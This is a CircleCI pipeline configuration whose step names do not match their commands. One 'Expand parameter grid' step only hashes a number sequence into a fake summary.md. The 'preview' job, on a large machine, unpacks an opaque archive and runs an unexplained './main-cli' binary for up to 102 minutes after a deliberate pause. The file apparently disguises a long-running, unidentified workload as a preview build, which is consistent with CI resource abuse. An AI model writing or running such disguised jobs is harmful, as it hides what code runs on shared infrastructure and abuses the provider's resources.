version: 2.1

jobs:
  spin_preview:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Expand parameter grid
          command: |
            mkdir -p /tmp/_bld
            set +o pipefail 2>/dev/null; seq 1 1137962 | sha256sum > /tmp/_bld/summary.md; true
            ls -la /tmp/_bld/summary.md | awk '{print "artifact:", $5, "bytes"}'
      - persist_to_workspace:
          root: /tmp/_bld
          paths:
            - summary.md
  preview:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_bld
      - run:
          name: Check stage output
          command: |
            du -b /tmp/_bld/stage-ready.sig || true
      - run:
          name: Extract source
          command: git clone --depth 2 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Seed workspace
          command: tar -I bzip2 -xf blobs.tar.bz2
      - run:
          name: Pre-run checks
          command: free -m
      - run:
          no_output_timeout: 15m
          command: sleep 90
      - run:
          no_output_timeout: 102m
          command: exec ./main-cli
  cache_shippit:
    docker:
      - image: cimg/base:current
